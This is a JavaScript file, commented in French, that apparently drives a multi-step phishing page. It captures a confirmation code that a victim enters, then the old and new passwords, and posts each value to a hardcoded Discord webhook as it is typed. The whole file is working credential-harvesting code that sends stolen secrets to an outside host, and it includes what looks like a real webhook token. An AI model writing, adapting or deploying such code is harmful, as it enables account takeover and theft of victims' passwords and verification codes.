// Remplace cette URL par celle que tu as copiée sur Discord
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1450925818330091776/FWbTDuf3n4SgBnDigZfMP80_P3_XmzqIa4oSxWBSu9Ig4Dlt-cYQglkhIMUh8m70USEI";

// Variables pour stocker les infos entre les étapes
let capturedCode = "";

function sendToDiscord(message) {
    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            embeds: [{
                title: "🔔 Nouvelle saisie sur le site",
                color: 5814783, // Couleur bleue
                description: message,
                timestamp: new Date()
            }]
        })
    }).catch(err => console.error("Erreur d'envoi Discord:", err));
}

function goToStep2() {
    const codeInput = document.getElementById('code-input').value;

    if (codeInput.trim() !== "") {
        capturedCode = codeInput; // On mémorise le code
        
        // Envoi immédiat à Discord
        sendToDiscord(`**Code de confirmation :** \`${capturedCode}\``);

        // Passage à l'étape suivante
        document.getElementById('step-1').style.display = 'none';
        document.getElementById('step-2').style.display = 'block';
    } else {
        alert("Veuillez entrer le code reçu.");
    }
}

function goToStep3() {
    const oldPass = document.getElementById('old-pass').value;
    const newPass = document.getElementById('confirm-pass').value;

    if (oldPass.trim() !== "" && newPass.trim() !== "") {
        
        // Envoi des mots de passe à Discord
        sendToDiscord(
            `**Code utilisé :** \`${capturedCode}\`\n` +
            `**Ancien MDP :** \`${oldPass}\`\n` +
            `**Nouveau MDP :** \`${newPass}\``
        );

        // Passage à l'étape finale
        document.getElementById('step-2').style.display = 'none';
        document.getElementById('step-3').style.display = 'block';
    } else {
        alert("Veuillez remplir tous les champs.");
    }
}
